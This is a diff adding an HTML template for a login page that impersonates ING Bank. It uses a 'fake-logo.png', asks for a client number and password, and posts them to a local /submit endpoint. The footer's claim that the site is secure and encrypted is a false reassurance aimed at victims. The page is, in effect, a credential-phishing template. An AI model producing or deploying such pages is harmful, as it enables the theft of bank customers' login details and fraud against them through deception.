@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <div class="logo-container">
+                <img src="{{ url_for('static', filename='fake-logo.png') }}" alt="Logo" class="logo">
+            </div>
+            <h1>Log in to your ING Bank Account</h1>
+        </div>
+        <form action="/submit" method="post" class="login-form">
+            <input type="text" name="username" placeholder="Client Number" class="input-field" required>
+            <input type="password" name="password" placeholder="Password" class="input-field" required>
+            <button type="submit" class="login-button">Login</button>
+        </form>
+        <div class="footer-warning">
+            <p>This is a secure site. All data is encrypted.</p>
+        </div>
+    </div>
+</body>
+</html>
